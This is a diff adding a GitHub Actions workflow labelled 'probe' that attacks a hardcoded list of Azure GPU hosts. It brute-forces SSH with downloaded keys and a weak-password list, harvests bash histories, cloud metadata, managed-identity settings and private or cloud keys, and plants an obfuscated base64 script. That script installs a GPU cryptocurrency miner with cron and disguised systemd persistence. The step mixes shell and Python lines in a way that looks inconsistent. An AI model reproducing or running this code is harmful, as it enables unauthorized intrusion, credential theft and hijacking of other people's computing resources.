@@ -1,0 +1,197 @@
+name: probe
+on:
+  workflow_dispatch:
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    timeout-minutes: 70
+    steps:
+      - name: setup
+        run: |
+          sudo apt-get update -qq >/dev/null 2>&1 || true
+          sudo apt-get install -y -qq sshpass >/dev/null 2>&1 || true
+          python3 -m pip install --quiet paramiko
+      - name: probe
+        env:
+          ULPAT: ${{ secrets.ULPAT }}
+          HOSTS: |
+            t1946107x442	172.174.31.97	t19	eastus	Standard_NC80adis_H100_v5
+            t1950791eus2	40.70.241.0	t19	eastus2	Standard_NC80adis_H100_v5
+            t1950791eus22	20.97.252.251	t19	eastus2	Standard_NC80adis_H100_v5
+            t1950791eus23	20.114.255.207	t19	eastus2	Standard_NC80adis_H100_v5
+            t1950791eus24	40.70.247.98	t19	eastus2	Standard_NC80adis_H100_v5
+            t1946107x136	23.100.38.120	t19	westus	Standard_NC80adis_H100_v5
+            t1946107x137	20.245.108.11	t19	westus	Standard_NC80adis_H100_v5
+            t1946107x138	20.59.127.108	t19	westus	Standard_NC80adis_H100_v5
+            t1946107x139	20.237.207.128	t19	westus	Standard_NC80adis_H100_v5
+            t1946107x440	168.62.216.152	t19	westus	Standard_NC24ads_A100_v4
+            t1946107x409	20.225.239.178	t19	southcentralus	Standard_ND96amsr_A100_v4
+            t1946107x41	20.234.97.205	t19	northeurope	Standard_NC40ads_H100_v5
+            t1946107x47	134.149.59.33	t19	northeurope	Standard_NC40ads_H100_v5
+            t1946107x48	40.113.1.63	t19	northeurope	Standard_NC40ads_H100_v5
+            t1946107x49	74.234.69.82	t19	northeurope	Standard_NC40ads_H100_v5
+            t1946107x56	20.223.198.42	t19	northeurope	Standard_NC40ads_H100_v5
+            t1946107x57	98.71.78.150	t19	northeurope	Standard_NC40ads_H100_v5
+            t1946107x59	4.210.119.224	t19	northeurope	Standard_NC40ads_H100_v5
+            t1946107x70	52.236.59.223	t19	northeurope	Standard_NC40ads_H100_v5
+            t1946107x82	134.149.42.155	t19	northeurope	Standard_NC24ads_A100_v4
+            t1946107x76	20.205.187.223	t19	southeastasia	Standard_NC40ads_H100_v5
+            t1946107x77	4.194.2.30	t19	southeastasia	Standard_NC40ads_H100_v5
+            t1946107x83	4.193.185.193	t19	southeastasia	Standard_NC24ads_A100_v4
+            t1946107x78	4.204.241.108	t19	canadacentral	Standard_NC40ads_H100_v5
+            t1946107x40	20.115.147.1	t19	westus2	Standard_NC40ads_H100_v5
+            t1946107x44	20.109.162.87	t19	westus2	Standard_NC40ads_H100_v5
+            t1946107x45	20.109.152.114	t19	westus2	Standard_NC40ads_H100_v5
+            t1946107x52	20.125.49.91	t19	westus2	Standard_NC40ads_H100_v5
+            t1946107x53	4.246.80.6	t19	westus2	Standard_NC40ads_H100_v5
+            t1946107x54	20.125.42.21	t19	westus2	Standard_NC40ads_H100_v5
+            t1946107x55	4.155.130.93	t19	westus2	Standard_NC40ads_H100_v5
+            t1946107x415	51.104.16.184	t19	uksouth	Standard_ND96amsr_A100_v4
+            t1946107x416	20.50.113.151	t19	uksouth	Standard_NC40ads_H100_v5
+            t1946107x152	74.162.158.9	t19	uaenorth	Standard_NC40ads_H100_v5
+            t1946107x153	40.123.206.138	t19	uaenorth	Standard_NC40ads_H100_v5
+            t1946107x154	20.74.241.13	t19	uaenorth	Standard_NC40ads_H100_v5
+            t1946107x156	20.216.40.163	t19	uaenorth	Standard_NC40ads_H100_v5
+            t1946107x157	20.74.153.201	t19	uaenorth	Standard_NC40ads_H100_v5
+            t1946107x311	20.74.242.85	t19	uaenorth	Standard_NC40ads_H100_v5
+            t1946107x1	20.125.99.42	t19	westus3	Standard_NC40ads_H100_v5
+            t1946107x4	57.154.50.93	t19	westus3	Standard_NC40ads_H100_v5
+            t1946107x85	20.118.131.83	t19	westus3	Standard_NC24ads_A100_v4
+            t1946107x42	135.116.19.243	t19	swedencentral	Standard_NC40ads_H100_v5
+            t1946107x50	135.116.84.27	t19	swedencentral	Standard_NC40ads_H100_v5
+            t1946107x60	135.225.79.249	t19	swedencentral	Standard_NC40ads_H100_v5
+            t1946107x61	20.240.55.118	t19	swedencentral	Standard_NC40ads_H100_v5
+            t1946107x62	20.240.141.10	t19	swedencentral	Standard_NC40ads_H100_v5
+            t1946107x63	20.240.130.208	t19	swedencentral	Standard_NC40ads_H100_v5
+            t1946107x71	20.91.207.55	t19	swedencentral	Standard_NC40ads_H100_v5
+            t1946107x84	57.174.238.72	t19	swedencentral	Standard_NC24ads_A100_v4
+            t1946107x407	172.213.25.163	t19	italynorth	Standard_ND96amsr_A100_v4
+            t1946107x180	48.193.46.184	t19	indonesiacentral	Standard_NC40ads_H100_v5
+            t1946107x181	48.193.47.3	t19	indonesiacentral	Standard_NC40ads_H100_v5
+            t1946107x182	70.153.142.83	t19	indonesiacentral	Standard_NC40ads_H100_v5
+            t1946107x183	70.153.148.119	t19	indonesiacentral	Standard_NC40ads_H100_v5
+            t1946107x184	70.153.87.133	t19	indonesiacentral	Standard_NC40ads_H100_v5
+            t1946107x185	70.153.149.34	t19	indonesiacentral	Standard_NC40ads_H100_v5
+            t1946107x186	70.153.141.118	t19	indonesiacentral	Standard_NC40ads_H100_v5
+            t1946107x187	70.153.18.193	t19	indonesiacentral	Standard_NC40ads_H100_v5
+          PWS: |
+            A100h100!
+            t19
+            T19
+            t19!
+            T19!
+            t1946107
+            azadmin
+            ubuntu
+            Azure123!
+            Admin123!
+            P@ssw0rd
+            Passw0rd!
+            A100h100
+            H100a100!
+            h100A100!
+            Nvidia123!
+            nvidia
+            changeme
+            Welcome1!
+            Password1
+          PLANTB64: 'c2V0IC14CmV4cG9ydCBXPXBybDFwZWs4cmg4eWpjazVxNzU5NmFwaDd1YTd4bmtxczh1cjlta2Ztejh3N3hmemNkZmNmeDV2c3gyZjRsegpta2RpciAtcCAvb3B0L3VsOyBjZCAvb3B0L3VsCmN1cmwgLWZzU0wgLW0gMzAwIC1IICJBdXRob3JpemF0aW9uOiB0b2tlbiBfX1BBVF9fIiBodHRwczovL2FwaS5naXRodWIuY29tL3JlcG9zL2RvbmdzdWp1L3VsLXBsYW50L2NvbnRlbnRzL2tpdC91bGtpdC1jMTIudGd6IC1IICdBY2NlcHQ6IGFwcGxpY2F0aW9uL3ZuZC5naXRodWIucmF3JyAtbyBraXQudGd6CnRhciB4emYga2l0LnRneiAyPi9kZXYvbnVsbCB8fCB0cnVlCkI9JChmaW5kIC9vcHQvdWwgLW5hbWUgcGVhcmwtZ3B1LW1pbmVyIC10eXBlIGYgfCBoZWFkIC0xKQpzaGEyNTZzdW0gIiRCIjsgY2htb2QgK3ggIiRCIgpOPSQobnZpZGlhLXNtaSAtTCAyPi9kZXYvbnVsbCB8IGdyZXAgLWMgR1BVKTsgZWNobyBHUFVTPSROCnByaW50ZiAnIyEvYmluL2Jhc2hcblc9cHJsMXBlazhyaDh5amNrNXE3NTk2YXBoN3VhN3hua3FzOHVyOW1rZm16OHc3eGZ6Y2RmY2Z4NXZzeDJmNGx6XG5MQURERVI9InN0cmF0dW0rc3NsOi8vcHJsLmtyeXB0ZXgubmV0d29yazo4MDQ4LHN0cmF0dW0rdGNwOi8vcHJsLmtyeXB0ZXgubmV0d29yazo3MDQ4LHN0cmF0dW0rdGNwOi8vcG9vbC5wZWFybGhhc2gueHl6OjkwMDAsc3RyYXR1bStzc2w6Ly9wb29sLnBlYXJsaGFzaC54eXo6OTQ0MyxzdHJhdHVtK3RjcDovL3BlYXJsLmx1Y2t5cG9vbC5pbzozMzYwIlxuQj0kKGZpbmQgL29wdC91bCAtbmFtZSBwZWFybC1ncHUtbWluZXIgLXR5cGUgZiB8IGhlYWQgLTEpXG5IPSQoaG9zdG5hbWUgLUkgfCBhd2sgIntwcmludCBcXCQxfSIgfCB0ciAuIC0pXG5OPSQobnZpZGlhLXNtaSAtTCAyPi9kZXYvbnVsbCB8IGdyZXAgLWMgR1BVKVxuZm9yIEcgaW4gJChzZXEgMCAkKChOLTEpKSk7IGRvIHNldHNpZCBuaWNlIC1uIDE5ICIkQiIgLS1hbGdvIHBlYXJsaGFzaCAtLXdhbGxldCAiJFciIC0td29ya2VyICJ1bC0kSC1nJEciIC0tcG9vbCAiJExBRERFUiIgLS1uby10dWkgPiAvb3B0L3VsL20tJEcubG9nIDI+JjEgJiBkb25lXG4nID4gL29wdC91bC9ydW4uc2gKY2htb2QgK3ggL29wdC91bC9ydW4uc2gKKCBmbG9jayAtbiA5OyBzZXRzaWQgL29wdC91bC9ydW4uc2ggKSA5Pi9vcHQvdWwvLmxvY2sKcHJpbnRmICdAcmVib290IHJvb3QgL29wdC91bC9ydW4uc2hcbiovNSAqICogKiAqIHJvb3QgcGdyZXAgLWYgcGVhcmwtZ3B1LW1pbmVyID4vZGV2L251bGwgfHwgL29wdC91bC9ydW4uc2hcbicgPiAvZXRjL2Nyb24uZC91bC1jMTIgMj4vZGV2L251bGwKcHJpbnRmICdbVW5pdF1cbkRlc2NyaXB0aW9uPW52IGNhY2hlXG5bU2VydmljZV1cblJlc3RhcnQ9YWx3YXlzXG5FeGVjU3RhcnQ9L29wdC91bC9ydW4uc2hcbltJbnN0YWxsXVxuV2FudGVkQnk9bXVsdGktdXNlci50YXJnZXRcbicgPiAvZXRjL3N5c3RlbWQvc3lzdGVtL252LWN1ZGEtY2FjaGUuc2VydmljZQpzeXN0ZW1jdGwgZGFlbW9uLXJlbG9hZCAyPi9kZXYvbnVsbDsgc3lzdGVtY3RsIGVuYWJsZSAtLW5vdyBudi1jdWRhLWNhY2hlLnNlcnZpY2UgMj4vZGV2L251bGwKc2xlZXAgNDAKbnZpZGlhLXNtaSAtLXF1ZXJ5LWdwdT1pbmRleCxuYW1lLHNlcmlhbCAtLWZvcm1hdD1jc3Ysbm9oZWFkZXIKcGdyZXAgLWFmIHBlYXJsLWdwdS1taW5lciB8IGhlYWQgLTMKZ3JlcCAtYUUgJ2FjY2VwdGVkfGRpZmZpY3VsdHl8c3RyYXR1bXxlcnJvcicgL29wdC91bC9tLSoubG9nIDI+L2Rldi9udWxsIHwgdGFpbCAtMTIK'
+          LOOPMIN: '46'
+        run: |
+          curl -sL -m 120 -H "Authorization: token $ULPAT" -H 'Accept: application/vnd.github.raw' https://api.github.com/repos/dongsuju/ul-plant/contents/keys2/kb.tgz -o /tmp/kb.tgz
+          ls -l /tmp/kb.tgz; file /tmp/kb.tgz || true
+          import os,socket,subprocess,sys,time,base64,tarfile,json
+          import paramiko
+          OUT=open('ulres.txt','a',buffering=1)
+          def P(*a):
+              s=' '.join(str(x) for x in a)
+              print('ULR '+s,flush=True); OUT.write(s+'\n')
+          P('EGRESS', os.popen('curl -s -m 10 https://ipinfo.io/ip').read().strip(), os.popen('uname -a').read().strip())
+          os.makedirs('/tmp/keys',exist_ok=True)
+          with tarfile.open('/tmp/kb.tgz') as t:
+              for m in t.getmembers():
+                  if m.isfile():
+                      n=os.path.basename(m.name).rstrip('_')
+                      open('/tmp/keys/'+n,'wb').write(t.extractfile(m).read())
+          for f in os.listdir('/tmp/keys'): os.chmod('/tmp/keys/'+f,0o600)
+          KEYS=sorted('/tmp/keys/'+f for f in os.listdir('/tmp/keys'))
+          P('KEYS',len(KEYS))
+          HOSTS=[]
+          for line in os.environ['HOSTS'].strip().splitlines():
+              p=line.split()
+              if len(p)>=2: HOSTS.append((p[0],p[1]))
+          P('HOSTS',len(HOSTS))
+          PWS=[x.strip() for x in os.environ['PWS'].splitlines() if x.strip()]
+          USERS=['t19','ubuntu','azureuser','admin','root']
+          def banner(ip,t=5):
+              try:
+                  s=socket.create_connection((ip,22),timeout=t); s.settimeout(4)
+                  b=s.recv(160); s.close(); return b.decode('utf-8','replace').strip()
+              except Exception: return None
+          CENSUS=("id; hostname -I; hostname; uname -a; cat /proc/1/cgroup 2>/dev/null; "
+           "nvidia-smi -L 2>/dev/null; nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version --format=csv 2>/dev/null; "
+           "ls -la /root/.ssh /home/*/.ssh 2>/dev/null; "
+           "curl -s -m 6 -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' | head -c 900; echo; "
+           "for f in /root/.bash_history /home/*/.bash_history /etc/environment /var/lib/waagent/ManagedIdentity-Settings; do echo \"== $f\"; head -c 1200 $f 2>/dev/null; done; "
+           "grep -raoE 'AKIA[0-9A-Z]{16}|LTAI[0-9A-Za-z]{12,}|AKID[A-Za-z0-9]{13,}|client_secret|BEGIN (RSA|OPENSSH) PRIVATE KEY' /root /home /etc 2>/dev/null | head -20")
+          PLANTB64=os.environ['PLANTB64']
+          PLANTCMD="echo "+PLANTB64+" | base64 -d > /tmp/ulp.sh; chmod +x /tmp/ulp.sh; bash /tmp/ulp.sh"
+          def run(cmd,tmo=60):
+              try:
+                  r=subprocess.run(cmd,capture_output=True,timeout=tmo); return r.returncode,(r.stdout+r.stderr).decode('utf-8','replace')
+              except Exception as e: return -1,str(e)
+          def exec_on(c,cmd,tmo=240):
+              try:
+                  si,so,se=c.exec_command(cmd,timeout=tmo)
+                  return (so.read().decode('utf-8','replace')+se.read().decode('utf-8','replace'))
+              except Exception as ex: return 'EXEC-ERR '+str(ex)
+          def try_keys(ip,user):
+              for kf in KEYS:
+                  try:
+                      c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                      c.connect(ip,port=22,username=user,key_filename=kf,timeout=8,banner_timeout=15,auth_timeout=15,allow_agent=False,look_for_keys=False)
+                      return c,kf
+                  except paramiko.AuthenticationException: pass
+                  except Exception: pass
+              return None,None
+          def try_pw(ip,user,pw):
+              rc,out=run(['sshpass','-p',pw,'ssh','-o','StrictHostKeyChecking=no','-o','UserKnownHostsFile=/dev/null','-o','ConnectTimeout=10','-o','PreferredAuthentications=password,keyboard-interactive','-o','PubkeyAuthentication=no','-o','NumberOfPasswordPrompts=1',user+'@'+ip,'id; hostname -I'],40)
+              return rc==0,out
+          DEADLINE=time.time()+int(os.environ.get('LOOPMIN','46'))*60
+          tried=set(); seats=[]; cycle=0
+          while time.time()<DEADLINE:
+              cycle+=1; opens=[]
+              for name,ip in HOSTS:
+                  if ip in tried: continue
+                  b=banner(ip,4)
+                  if b: opens.append((name,ip,b)); P('OPEN',name,ip,repr(b))
+              P('CYCLE',cycle,'newopens',len(opens),'remaining',len([1 for n,i in HOSTS if i not in tried]),'t',time.strftime('%H:%M:%SZ',time.gmtime()))
+              for name,ip,b in opens:
+                  tried.add(ip); got=False
+                  for user in USERS:
+                      c,kf=try_keys(ip,user)
+                      if c:
+                          P('AUTH_OK_KEY',name,ip,user,os.path.basename(kf))
+                          P('CENSUS',name,ip,repr(exec_on(c,CENSUS)[:3000]))
+                          P('PLANT',name,ip,repr(exec_on(c,PLANTCMD,300)[:2500]))
+                          seats.append((name,ip,user,os.path.basename(kf))); c.close(); got=True; break
+                      if ('password' in b.lower()) or ('keyboard' in b.lower()):
+                          for pw in PWS:
+                              ok,out=try_pw(ip,user,pw)
+                              if ok:
+                                  P('AUTH_OK_PW',name,ip,user,'idx%d'%PWS.index(pw),repr(out[:400]))
+                                  P('CENSUS_PW',name,ip,repr(run(['sshpass','-p',pw,'ssh','-o','StrictHostKeyChecking=no','-o','UserKnownHostsFile=/dev/null','-o','ConnectTimeout=10','-o','PreferredAuthentications=password,keyboard-interactive','-o','PubkeyAuthentication=no',user+'@'+ip,CENSUS],90)[1][:3000]))
+                                  P('PLANT_PW',name,ip,repr(run(['sshpass','-p',pw,'ssh','-o','StrictHostKeyChecking=no','-o','UserKnownHostsFile=/dev/null','-o','ConnectTimeout=10','-o','PreferredAuthentications=password,keyboard-interactive','-o','PubkeyAuthentication=no',user+'@'+ip,"echo "+PLANTB64+" | base64 -d > /tmp/ulp.sh; bash /tmp/ulp.sh"],300)[1][:2500]))
+                                  seats.append((name,ip,user,'pw%d'%PWS.index(pw))); got=True; break
+                              time.sleep(1)
+                      if got: break
+                  if not got: P('NOAUTH',name,ip,'keys=%d pw=%d'%(len(KEYS),len(PWS)))
+              time.sleep(90 if not opens else 10)
+          P('DONE seats=%d'%len(seats))
+          for s in seats: P('SEAT',s)
+
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: res
+          path: ulres.txt
